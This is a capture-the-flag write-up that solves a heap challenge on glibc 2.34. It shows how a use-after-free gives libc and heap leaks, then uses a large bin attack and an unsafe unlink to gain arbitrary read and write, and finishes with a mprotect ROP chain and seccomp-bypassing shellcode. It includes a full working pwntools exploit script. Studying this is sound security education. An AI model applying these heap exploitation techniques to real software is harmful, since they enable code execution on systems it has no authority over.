# The Revenge of Womp Womp — ehaxCTF 2026
### Category: Heap Exploitation

---

## Table of Contents
1. [Challenge Overview](#1-challenge-overview)
2. [Reconnaissance](#2-reconnaissance)
3. [Understanding the Binary](#3-understanding-the-binary)
4. [The Vulnerability: Use-After-Free](#4-the-vulnerability-use-after-free)
5. [Phase 1 — Information Leaks](#5-phase-1--information-leaks)
6. [Phase 2 — Arbitrary Read/Write](#6-phase-2--arbitrary-readwrite)
7. [Phase 3 — Code Execution](#7-phase-3--code-execution)
8. [Full Exploit Script](#8-full-exploit-script)
9. [Flag](#9-flag)

---

## 1. Challenge Overview

Files given:
- `pwn` — the challenge binary
- `pwn_patched` — binary patched to use the provided libc
- `libc.so.6` — Ubuntu glibc 2.34
- `ld.so` — dynamic linker

Goal: read `./flag` on the remote server.

---

## 2. Reconnaissance

### Security mitigations

```bash
checksec ./pwn_patched
```

```
Arch:   amd64-64-little
RELRO:  Full RELRO
Stack:  Canary found
NX:     NX enabled
PIE:    No PIE (0x400000)
```

| Protection | What it does | Impact |
|------------|-------------|--------|
| Full RELRO | GOT is read-only | Cannot overwrite GOT function pointers |
| Stack Canary | Random value checked on return | Cannot do classic stack overflow |
| NX | Stack/heap not executable | Cannot put shellcode on stack/heap directly |
| No PIE | Binary loads at fixed 0x400000 | Binary code addresses are always known — no leak needed for the binary itself |

**Important:** No PIE only fixes the binary's own addresses. The **stack and libc are still randomized by ASLR** every run.

### libc version

```bash
strings libc.so.6 | grep "GNU C Library"
# GNU C Library (Ubuntu GLIBC 2.34-0ubuntu3)
```

glibc 2.34 matters because:
- `__malloc_hook` / `__free_hook` are **removed** (no easy hook overwrite)
- `main_arena` symbol is **not exported** (offsets must be hardcoded)

### Seccomp filter

```bash
seccomp-tools dump ./pwn_patched
```

Key rules:
- `execve` → **BLOCKED** (can't spawn a shell)
- `read` → only `fd=0` allowed
- `write` → only `fd=1` or `fd=2` allowed
- `open`, `mprotect`, `mmap`, `exit` → allowed

This forces us to use an open-read-write (ORW) approach with a special trick for the `fd=0` restriction (explained in Phase 3).

---

## 3. Understanding the Binary

### The bytecode VM

The program is a **bytecode interpreter**. Each round it prints `Pls input the opcode`, reads up to 0x500 bytes of raw bytes, and interprets them as a stream of opcodes terminated by `0x05`.

Opcode formats (reversed from `FUN_00401695`):

```
0x01 [idx:1] [size:2]           → malloc(idx, size)
0x02 [idx:1]                    → free(idx)
0x03 [idx:1]                    → show(idx)   — calls puts(ptr_array[idx])
0x04 [idx:1] [size:2] [data:N]  → edit(idx, size, data) — memcpy(ptr_array[idx], data, ...)
0x05                            → stop (return from dispatcher)
0x06                            → diag (print pointer guard address)
```

Two global arrays (fixed addresses — no PIE):
- `0x404180` — pointer array `ptr_array[0..16]`
- `0x404220` — size array `size_array[0..16]`

Allocation constraint from `do_malloc`: size must be **0x410 to 0x500**. This forces all chunks into large bin territory (glibc large chunk threshold: ≥ 0x400 bytes).

### Dynamic analysis setup

```bash
gdb ./pwn_patched
```

Useful pwndbg commands:

```
pwndbg> checksec
pwndbg> vmmap                        # view memory layout + permissions
pwndbg> heap                         # view all heap chunks
pwndbg> bins                         # view all free bins
pwndbg> vis_heap_chunks              # visual heap layout
pwndbg> x/16gx 0x404180             # inspect ptr_array
pwndbg> telescope $rsp 30            # inspect the stack
pwndbg> b *0x401695                  # break at opcode dispatcher
pwndbg> b *0x4017ca                  # break at main loop
```

Find `main_arena` offset in your libc:

```
pwndbg> r
# (send \x05\n to keep binary alive)
pwndbg> p &main_arena
# e.g. 0x7ffff7f19c60
pwndbg> p (long)(&main_arena) - (long)libc_base
# e.g. 0x219c60
# unsorted bin head = main_arena + 0x60 → total offset from libc base = 0x219cc0
```

---

## 4. The Vulnerability: Use-After-Free

### What is Use-After-Free?

Dynamic memory lifecycle:
```
malloc() → [use it] → free() → [memory returned to allocator]
```

After `free()`, the memory no longer belongs to your program. If you still use the old pointer to read or write — that is a **Use-After-Free (UAF)**.

**Hotel analogy:** `malloc()` = hotel gives you room 304 + keycard. `free()` = you check out. **UAF** = you kept a copy of the keycard and sneak back in. The room may already belong to another guest.

### The bug

The `do_free` handler:

```c
void do_free(long param_1) {
    byte idx = *(byte*)(param_1 + 1);
    if (idx < 17 && ptr_array[idx] != NULL) {
        free(ptr_array[idx]);
        // ← MISSING: ptr_array[idx] = NULL;   ← THE BUG
    }
}
```

One missing line. `ptr_array[idx]` still holds the old pointer after free. Both `show` and `edit` check `ptr_array[idx] != NULL` — they still pass:

```c
// show: still runs after free — UAF Read
puts(ptr_array[idx]);

// edit: still runs after free — UAF Write
memcpy(ptr_array[idx], data, size);
```

### What UAF gives us

**UAF Read → Information Leak**

When glibc frees a large chunk (≥ 0x400 bytes), it writes linked-list pointers directly into the chunk's former user data:

```
After free(chunk1):
  chunk1 at 0x55555555a430:
    +0x00: fd  = 0x7ffff7f19cc0   ← points into libc's main_arena!
    +0x08: bk  = 0x7ffff7f19cc0
```

`show(1)` after `free(1)` → `puts()` prints the libc pointer → **libc address leaked**.

**UAF Write → Heap Corruption**

`edit(1, data)` after `free(1)` → `memcpy()` overwrites glibc's internal free list pointers inside the freed chunk → lets us manipulate where future allocations go.

---

## 5. Phase 1 — Information Leaks

### Goal
- `libc.address` — libc base (bypasses ASLR for libc)
- `chunk1_addr` — a known heap address (bypasses ASLR for heap)

### How the unsorted bin leak works

Freed large chunks enter the **unsorted bin** — a doubly-linked circular list. The list pointers live directly in the chunk's memory:

```
One free chunk in unsorted bin:
  [main_arena head] ←→ [chunk1]
  chunk1->fd = &main_arena.unsorted_bin_head   ← inside libc!

Two free chunks (chunk1 freed first, then chunk3):
  [main_arena head] ←→ [chunk3] ←→ [chunk1]
  chunk3->fd = chunk1   ← heap address!
```

So:
- `show(chunk freed first)` → prints fd = **libc address**
- `show(chunk freed second)` → prints fd = **heap address** (address of first freed chunk)

### The leak code

```python
opcode  = malloc(0, 0x410)
opcode += malloc(1, 0x420)   # chunk1: libc leak
opcode += malloc(2, 0x410)   # chunk2: barrier (prevents consolidation)
opcode += malloc(3, 0x410)   # chunk3: heap leak
opcode += malloc(4, 0x410)
opcode += malloc(5, 0x410)   # chunk5: top barrier

opcode += free(1)            # chunk1 → unsorted bin; fd/bk = main_arena
opcode += show(1)            # puts(chunk1->fd) → libc address

opcode += free(3)            # chunk3 → unsorted bin in front; fd = chunk1
opcode += show(3)            # puts(chunk3->fd) → chunk1 heap address

send_opcode(opcode)

# Output sequence:
# "Del Done\n"           ← free(1)
# <6 bytes libc>\n       ← show(1)
# "Show Done\n"
# "Del Done\n"           ← free(3)
# <2-6 bytes heap>\n     ← show(3)
# "Show Done\n"

p.recvuntil(b'Del Done\n')
libc.address = u64(p.recv(6) + b'\x00\x00') - 0x219CC0

p.recvuntil(b'Del Done\n')
chunk1_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
chunk3_addr = chunk1_addr + 0x850
# 0x850 = chunk1_size(0x430) + chunk2_size(0x420)
```

Verify in pwndbg:
```
pwndbg> bins
# chunk1 and chunk3 should appear in unsorted bin
pwndbg> x/4gx chunk1_addr
# first two values = main_arena pointers (libc addresses)
```

---

## 6. Phase 2 — Arbitrary Read/Write

### Goal

```python
edit(4, 8, p64(any_address))   # aim: set ptr_array[1] = any_address
show(1)                         # read: leak memory at any_address
edit(1, n, data)                # write: write to any_address
```

### The key insight

Global pointer array at `0x404180`:
```
0x404188: ptr_array[1] = chunk1_addr   ← want to control the VALUE here
0x4041a0: ptr_array[4] = chunk4_addr   ← want to control WHERE THIS POINTS
```

If `ptr_array[4]` points near `ptr_array[1]`:
- `edit(4, 8, p64(X))` → overwrites `ptr_array[1]` with `X`
- `show(1)` / `edit(1)` → reads/writes at `X`

Problem: `edit(4, ...)` writes TO chunk4's buffer, not to the slot holding chunk4's address. We need glibc itself to write into `ptr_array[4]`. That's the **large bin attack**.

---

### Heap Fundamentals: The Large Bin

You know tcache (singly linked) and unsorted bin (doubly linked `fd`/`bk`).

The **large bin** is for chunks ≥ 0x400 bytes. It has **two sets of pointers**:

```
[free large chunk]
  +0x10: fd           ← next chunk (all chunks, main doubly linked list)
  +0x18: bk           ← prev chunk (all chunks, main doubly linked list)
  +0x20: fd_nextsize  ← next chunk of a DIFFERENT size (skip list)
  +0x28: bk_nextsize  ← prev chunk of a DIFFERENT size (skip list)
```

Why the extra pointers? The large bin holds many different sizes. `fd/bk` links ALL chunks. `fd_nextsize/bk_nextsize` is a "skip list" — only links the **first chunk of each unique size** so glibc can jump between sizes quickly.

Example — three freed chunks (0x430, 0x420a, 0x420b):
```
Main fd/bk list:
  [arena] ←→ [0x430] ←→ [0x420a] ←→ [0x420b]

Skip list (first of each size only):
  [0x430] ←→ [0x420a]
  (0x420b is same size as 0x420a → NOT in skip list)
```

---

### Trick 1: Large Bin Attack

#### How chunk1 ends up in the large bin

After Phase 1, chunk1 is in the unsorted bin and `ptr_array[1]` still points to it (UAF).

When we call `malloc(3, 0x410)`, glibc scans the unsorted bin:
- chunk1 (size 0x430) — not an exact fit for 0x420 request → **moved to large bin**
- chunk3 (size 0x420) — exact fit → returned directly

Now chunk1 sits in the large bin. But `ptr_array[1]` still = chunk1's address (UAF still active).

#### Corrupt chunk1's internals via UAF write

We call `edit(1, payload)` → `memcpy(ptr_array[1], payload, size)` → writes directly into freed chunk1 while it sits in the large bin:

```python
chunk4_global = 0x404180 + (8 * 4)   # = 0x4041a0 = &ptr_array[4]

def largebin_attack(addr):
    payload  = p64(libc.address + 0x21A0B0) * 2   # fd = bk = main_arena+0x450 (valid)
    payload += p64(chunk1_addr)                     # fd_nextsize = chunk1 itself
    payload += p64(addr - 0x20)                     # bk_nextsize = &ptr_array[4] - 0x20

    opcode  = malloc(3, 0x410)                       # re-alloc chunk3, triggers chunk1 → large bin
    opcode += edit(1, len(payload), payload)          # UAF write: corrupt chunk1's pointers
    opcode += free(3)                                 # free chunk3 → unsorted bin
    send_opcode(opcode)

largebin_attack(chunk4_global)
```

After this write, chunk1 has `bk_nextsize = 0x404180` (= ptr_array[4] - 0x20).

#### Trigger: insert chunk3 into the large bin

```python
opcode  = malloc(3, 0x410)               # chunk3 moved from unsorted → large bin
opcode += edit(1, len(payload2), payload2)  # fix chunk1 to be self-contained
send_opcode(opcode)
```

During this malloc, chunk3 (0x420) is inserted into the large bin behind chunk1 (0x430). The insertion code runs:

```c
fwd->fd_nextsize->bk_nextsize = victim;
// fwd = chunk1
// fwd->fd_nextsize = chunk1 itself (we set this)
// chunk1->bk_nextsize = 0x404180 (we forged this)
// → glibc writes chunk3_addr into *(0x404180 + 0x20) = *(0x4041a0)
// → ptr_array[4] = chunk3_addr
```

**Result: `ptr_array[4]` now holds chunk3's heap address** instead of chunk4's real buffer.

Verify in pwndbg:
```
pwndbg> x/gx 0x4041a0    # ptr_array[4] should now show chunk3's address
pwndbg> bins              # chunk1 and chunk3 in large bin
```

---

### Trick 2: Unsafe Unlink

#### What is unlinking?

When glibc frees a chunk, it checks if physically adjacent chunks are also free. If so, it merges them (coalescing). To merge, it **removes the adjacent free chunk from its bin** — called unlinking.

```c
// Remove chunk P from its doubly-linked list:
P->fd->bk = P->bk;
P->bk->fd = P->fd;

// Before: [A] ←→ [P] ←→ [B]
// After:  [A] ←→ [B]
```

#### The safety check

Modern glibc checks list consistency first:
```c
assert(P->fd->bk == P);
assert(P->bk->fd == P);
```

This stops naive forgery — if you point `P->fd` at an arbitrary address, `P->fd->bk` probably won't equal `P`.

#### Bypassing the check via the global array

Key observation: `ptr_array[1]` at address `0x404188` already holds `chunk1_addr`.

Set chunk1's pointers to:
```
chunk1->fd = ptr_array[1] - 0x18  =  0x404188 - 0x18  =  0x404170
chunk1->bk = ptr_array[1] - 0x10  =  0x404188 - 0x10  =  0x404178
```

Safety check:
```
chunk1->fd->bk  =  *(0x404170 + 0x18)  =  *(0x404188)  =  chunk1_addr  =  P  ✓
chunk1->bk->fd  =  *(0x404178 + 0x10)  =  *(0x404188)  =  chunk1_addr  =  P  ✓
```

Both pass — we made the pointers self-consistent by routing them back through `ptr_array[1]`.

#### What the unlink writes

```c
P->fd->bk = P->bk
→ *(0x404170 + 0x18) = 0x404178
→ ptr_array[1] = 0x404178

P->bk->fd = P->fd
→ *(0x404178 + 0x10) = 0x404170
→ ptr_array[1] = 0x404170   ← second write wins
```

**`ptr_array[1]` now = `0x404170` — pointing 0x18 bytes before itself in the global array.**

#### Triggering the unlink

chunk2 is physically adjacent to chunk1 in heap memory:
```
[chunk0][chunk1][chunk2][chunk3][chunk4][chunk5]
```

`free(2)` → glibc sees chunk1 (before chunk2) is free → tries to coalesce → **unlinks chunk1** → our forged pointers fire.

```python
payload  = p64(chunk4_global - 0x18)   # fd: makes fd->bk == chunk1_addr ✓
payload += p64(chunk4_global - 0x10)   # bk: makes bk->fd == chunk1_addr ✓
payload += p64(chunk1_addr) * 2        # size fields for prev_size check

opcode  = edit(1, len(payload), payload)   # UAF write: forge chunk1's fd/bk
opcode += free(2)                           # trigger coalescing → unlink chunk1
send_opcode(opcode)
```

#### Result: arbitrary read/write

```python
edit(4, 8, p64(X))   # write X into ptr_array[1]
show(1)              # puts(X) → read memory at X
edit(1, n, data)     # memcpy(X, data, n) → write to X
```

Verify:
```
pwndbg> x/8gx 0x404180    # ptr_array[1] should now point into the array itself
```

---

## 7. Phase 3 — Code Execution

### Step 3.1 — Leak the stack via `environ`

**Q: "The binary has no PIE — why do we need a stack leak?"**

No PIE only removes ASLR for the **binary's code** (fixed at 0x400000). The **stack is still randomized** every run. We need to overwrite a return address on the stack, so we must know where the stack is this run.

**Q: "Can't we just use `libc_base + environ_offset`?"**

There are two separate things called `environ`:

| | What it is | How we get it |
|---|---|---|
| `environ` the address | Location of the environ variable inside libc | `libc.address + fixed_offset` — computable from our libc leak |
| `environ` the value | Stack address stored IN that variable | Must READ it using arbitrary read |

```
libc_base + 0x21b110  =  address OF the environ variable in libc
                                        ↓ READ this
                         value stored there  =  stack address (random each run)
```

```python
opcode  = edit(4, 8, p64(libc.sym['environ']))   # aim ptr_array[1] at environ in libc
opcode += show(1)                                  # read the stack addr stored there
send_opcode(opcode)

p.recvuntil(b'Edit Done\n')
environ = u64(p.recv(6) + b'\x00\x00')
```

In pwndbg:
```
pwndbg> p &environ    # address of the environ variable in libc
pwndbg> p environ     # value = stack address
```

### Step 3.2 — Find the return address

We have a stack address but need the exact location of the main loop's return address. The binary has no PIE so the return address value is always `0x40186d` — we just need its **location** on the stack.

Scan stack slots below `environ` looking for a binary code range address (0x401000–0x402000):

```python
scan_offsets = list(range(0x148, 0x1a0, 8))

scan_ops = b"".join(
    edit(4, 8, p64(environ - off)) + show(1)
    for off in scan_offsets
)
p.sendlineafter(b'opcode\n', scan_ops + b'\x05')
scan_out = p.recvuntil(b'opcode\n')

for i, off in enumerate(scan_offsets):
    val = parse_value(scan_out, i)
    if 0x401100 <= val <= 0x402000:
        ret_addr = environ - off
        break
```

Why start at 0x148? Local variables on the stack can also hold binary code addresses (function pointers etc.). Starting deeper skips false positives and finds the actual saved return address.

In pwndbg, find the offset manually:
```
pwndbg> b *0x401695
pwndbg> r
pwndbg> telescope $rsp 60    # scan for 0x40186d in the stack
# note the address of that slot, subtract from environ value = offset
```

### Step 3.3 — NX bypass: mprotect + ROP

NX makes the stack `rw-` (no execute). We can't jump to shellcode on the stack directly.

Solution: call `mprotect(stack_page, 0x1000, 7)` to change the stack page to `rwx`, then execute shellcode.

**ROP (Return Oriented Programming):** Chain small existing code snippets ("gadgets") that each end with `ret`. By writing gadget addresses + values onto the stack, we control what the CPU does without injecting any code.

Find gadgets in libc:
```bash
ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
ROPgadget --binary libc.so.6 | grep "pop rsi ; ret"
ROPgadget --binary libc.so.6 | grep "pop rdx ; ret"
ROPgadget --binary libc.so.6 | grep "syscall ; ret"
```

ROP chain for `mprotect(stack_page, 0x1000, PROT_RWX)`:

```python
stack_page = (ret_addr + 80) & 0xfffffffffffff000   # page-align

payload  = p64(libc.address + 0x2a6c5)   # pop rdi; ret  → rdi = stack_page
payload += p64(stack_page)

payload += p64(libc.address + 0x2c081)   # pop rsi; ret  → rsi = 0x1000
payload += p64(0x1000)

payload += p64(libc.address + 0x5f65a)   # pop rdx; ret  → rdx = 7 (rwx)
payload += p64(7)

payload += p64(libc.address + 0x45f10)   # pop rax; ret  → rax = 10 (sys_mprotect)
payload += p64(10)

payload += p64(libc.address + 0xeb2a9)   # syscall; ret  → mprotect executes!

payload += p64(ret_addr + 80)            # jump to shellcode right after this chain
```

### Step 3.4 — Seccomp bypass: the fd=0 trick

Seccomp only allows `read(fd=0, ...)`. Normal ORW shellcode fails:

```c
fd = open("./flag", O_RDONLY);   // fd = 3 (or 4, 5...)
read(fd, buf, 100);              // BLOCKED — fd != 0
```

The trick: `open()` always returns the **lowest available fd**. Close fd=0 (stdin) first → `open("./flag")` gets fd=0 → `read(0, ...)` is allowed.

```c
close(0);                     // fd=0 now free
open("./flag", O_RDONLY);     // returns fd=0
read(0, buf, 100);            // allowed by seccomp ✓
write(1, buf, 100);
```

```python
shellcode  = asm(shellcraft.close(0))
shellcode += asm(shellcraft.open("./flag", 0))
shellcode += asm(shellcraft.read('rax', 0x404580, 100))   # rax = fd = 0
shellcode += asm(shellcraft.write(1, 0x404580, 'rax'))
shellcode += asm(shellcraft.exit(0))

payload += shellcode   # appended right after the ROP chain
```

### Step 3.5 — Write and trigger

```python
final_ops  = edit(4, 8, p64(ret_addr))       # ptr_array[1] = &return_address on stack
final_ops += edit(1, len(payload), payload)   # overwrite return addr with ROP+shellcode

p.send(final_ops + b'\x05\n')   # stop opcode → main loop returns → ROP fires
```

In pwndbg:
```
pwndbg> b *0x40186d          # break at the return address
pwndbg> c
pwndbg> telescope $rsp 30    # confirm ROP chain is on stack
pwndbg> c                    # step through mprotect
pwndbg> vmmap                # stack should now be rwx
pwndbg> c                    # shellcode executes → flag
```

---

## 8. Full Exploit Script

```python
from pwn import *

exe = context.binary = ELF('./pwn_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
HOST = "20.244.7.184"
PORT = 11111

def get_proc():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        p = process()
        if args.GDB:
            gdb.attach(p, gdbscript='b *0x40163b\nc')
        return p

def malloc(idx, size):
    return b'\x01' + p8(idx) + p16(size)

def free(idx):
    return b'\x02' + p8(idx)

def show(idx):
    return b'\x03' + p8(idx)

def edit(idx, size, data):
    return b'\x04' + p8(idx) + p16(size) + data

def send_opcode(op):
    p.sendlineafter(b'opcode\n', op + b'\x05')

p = get_proc()

# ============================================================
# PHASE 1: Information leaks (libc base + heap address)
# ============================================================

opcode  = malloc(0, 0x410)
opcode += malloc(1, 0x420)   # chunk1: libc leak via unsorted bin fd
opcode += malloc(2, 0x410)   # chunk2: barrier (prevents chunk1+chunk3 merging)
opcode += malloc(3, 0x410)   # chunk3: heap leak via unsorted bin fd
opcode += malloc(4, 0x410)
opcode += malloc(5, 0x410)   # chunk5: top barrier

opcode += free(1)
opcode += show(1)            # chunk1->fd = main_arena pointer = libc address
opcode += free(3)
opcode += show(3)            # chunk3->fd = chunk1 address = heap address
send_opcode(opcode)

p.recvuntil(b'Del Done\n')
libc.address = u64(p.recv(6) + b'\x00\x00') - 0x219CC0
print(f"libc base:   {hex(libc.address)}")

p.recvuntil(b'Del Done\n')
chunk1_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
chunk3_addr = chunk1_addr + 0x850
# 0x850 = chunk1 size (0x430) + chunk2 size (0x420)
print(f"chunk1 addr: {hex(chunk1_addr)}")
print(f"chunk3 addr: {hex(chunk3_addr)}")

# ============================================================
# PHASE 2: Arbitrary read/write
# ============================================================

chunk4_global = 0x404180 + (8 * 4)   # = 0x4041a0 = &ptr_array[4]

# --- Large bin attack: overwrite ptr_array[4] with chunk3's address ---

def largebin_attack(addr):
    payload  = p64(libc.address + 0x21A0B0) * 2   # fd = bk = main_arena+0x450
    payload += p64(chunk1_addr)                     # fd_nextsize = chunk1 itself
    payload += p64(addr - 0x20)                     # bk_nextsize = target - 0x20

    opcode  = malloc(3, 0x410)                       # re-alloc chunk3, triggers chunk1 → large bin
    opcode += edit(1, len(payload), payload)          # UAF write: corrupt chunk1's pointers
    opcode += free(3)                                 # chunk3 → unsorted bin
    send_opcode(opcode)

largebin_attack(chunk4_global)

# Re-alloc chunk3 → insertion into large bin → triggers write to ptr_array[4]
# Fix chunk1 to be self-contained in the skip list
payload  = p64(libc.address + 0x21A0B0) * 2
payload += p64(chunk1_addr) * 2

opcode  = malloc(3, 0x410)
opcode += edit(1, len(payload), payload)
send_opcode(opcode)

# --- Unsafe unlink: ptr_array[1] now points into the global array ---

payload  = p64(chunk4_global - 0x18)   # fd: fd->bk == ptr_array[1] == chunk1_addr ✓
payload += p64(chunk4_global - 0x10)   # bk: bk->fd == ptr_array[1] == chunk1_addr ✓
payload += p64(chunk1_addr) * 2        # size fields for prev_size check

opcode  = edit(1, len(payload), payload)   # UAF write: forge chunk1's fd/bk
opcode += free(2)                           # trigger coalescing → unlink chunk1
send_opcode(opcode)

# ============================================================
# PHASE 3: Code execution
# ============================================================

# --- Stack leak via environ ---
opcode  = edit(4, 8, p64(libc.sym['environ']))   # ptr_array[1] = &environ in libc
opcode += show(1)                                  # read stack address from environ
send_opcode(opcode)

p.recvuntil(b'Edit Done\n')
environ = u64(p.recv(6) + b'\x00\x00')
print(f"environ:     {hex(environ)}")

# --- Scan stack for return address ---
scan_offsets = list(range(0x148, 0x1a0, 8))
scan_ops = b"".join(
    edit(4, 8, p64(environ - off)) + show(1)
    for off in scan_offsets
)
p.sendlineafter(b'opcode\n', scan_ops + b'\x05')
scan_out = p.recvuntil(b'opcode\n')

parts = scan_out.split(b'Edit Done\n')
ret_addr = environ - 0x160   # fallback default

for i, off in enumerate(scan_offsets):
    if i + 1 >= len(parts):
        break
    chunk = parts[i+1]
    raw = chunk.split(b'\nShow Done\n')[0] if b'\nShow Done\n' in chunk else b''
    val = u64(raw[:8].ljust(8, b'\x00'))
    if 0x401100 <= val <= 0x402000:   # binary text address = saved return address
        ret_addr = environ - off
        print(f"ret_addr:    {hex(ret_addr)} (environ-{hex(off)}, val={hex(val)})")
        break
else:
    print(f"ret_addr:    {hex(ret_addr)} (fallback)")

# --- ROP chain: mprotect(stack_page, 0x1000, rwx) + jump to shellcode ---
stack_page = (ret_addr + 80) & 0xfffffffffffff000

payload  = p64(libc.address + 0x2a6c5)   # pop rdi; ret
payload += p64(stack_page)

payload += p64(libc.address + 0x2c081)   # pop rsi; ret
payload += p64(0x1000)

payload += p64(libc.address + 0x5f65a)   # pop rdx; ret
payload += p64(7)                         # PROT_READ|PROT_WRITE|PROT_EXEC

payload += p64(libc.address + 0x45f10)   # pop rax; ret
payload += p64(10)                        # sys_mprotect

payload += p64(libc.address + 0xeb2a9)   # syscall; ret

payload += p64(ret_addr + 80)            # jump to shellcode after this chain

# --- ORW shellcode with seccomp fd=0 trick ---
shellcode  = asm(shellcraft.close(0))           # close stdin → fd=0 is free
shellcode += asm(shellcraft.open("./flag", 0))  # open flag → gets fd=0
shellcode += asm(shellcraft.read('rax', 0x404580, 100))
shellcode += asm(shellcraft.write(1, 0x404580, 'rax'))
shellcode += asm(shellcraft.exit(0))

payload += shellcode

# --- Write payload and trigger ---
final_ops  = edit(4, 8, p64(ret_addr))
final_ops += edit(1, len(payload), payload)
p.send(final_ops + b'\x05\n')   # stop → main loop returns → ROP fires

try:
    out = p.recvall(timeout=5)
    print(out.decode(errors='replace'))
except Exception as e:
    print(f"error: {e}")
p.interactive()
```

Run:
```bash
python3 solution.py         # local
python3 solution.py REMOTE  # remote
python3 solution.py GDB     # with gdb attached
```

---

## 9. Flag

```
EH4X{w0mp_g0t_w0mpp3d_4g41n}
```

---

## Summary: Full Exploit Chain

```
Recon
  checksec  → Full RELRO, Canary, NX, No PIE
  seccomp   → execve blocked; read only fd=0; write only fd=1,2
  reversing → bytecode VM; UAF in free handler (ptr not nulled)

Phase 1: Information Leaks
  free(1) + show(1)  →  chunk1->fd = main_arena  →  libc base
  free(3) + show(3)  →  chunk3->fd = chunk1      →  heap address

Phase 2: Arbitrary Read/Write
  Large bin attack
    UAF write into freed chunk1 sitting in large bin
    forge chunk1->bk_nextsize = &ptr_array[4] - 0x20
    glibc's insertion code writes chunk3_addr into ptr_array[4]

  Unsafe unlink
    UAF write into freed chunk1
    forge chunk1->fd = &ptr_array[1] - 0x18
    forge chunk1->bk = &ptr_array[1] - 0x10
    free(2) triggers coalescing → unlinks chunk1
    safety check passes (ptr_array[1] already holds chunk1_addr)
    unlink writes ptr_array[1] = ptr_array[1] - 0x18

  Result
    edit(4, 8, p64(X)) → ptr_array[1] = X
    show(1)            → read memory at X
    edit(1, n, data)   → write to X

Phase 3: Code Execution
  Read libc.sym['environ']  →  stack address (ASLR bypassed for stack)
  Scan stack                →  find exact location of return address
  Write ROP chain           →  mprotect(stack_page, 0x1000, rwx)
  Jump to shellcode         →  close(0), open(flag)→fd=0, read(0), write(1)
  Send stop opcode          →  main loop returns → ROP fires → flag printed
```

---

## Key Concepts Reference

| Concept | One-liner |
|---------|-----------|
| UAF | free() without nulling ptr → can still read/write freed memory |
| Unsorted bin leak | freed chunk's fd/bk point into libc's main_arena |
| Large bin | chunks ≥ 0x400; has fd/bk_nextsize skip list for different sizes |
| Large bin attack | forge bk_nextsize → glibc insertion writes heap addr to our chosen target |
| Unsafe unlink | forge fd/bk through global array → glibc coalescing writes into ptr_array |
| No PIE ≠ no stack ASLR | binary code is fixed; stack is still randomized every run |
| environ trick | libc's environ variable holds a stack address → read it for stack leak |
| mprotect ROP | change stack to rwx via ROP gadgets → then execute shellcode |
| seccomp fd=0 trick | close(0) → open(flag)=fd=0 → read(fd=0) passes seccomp filter |
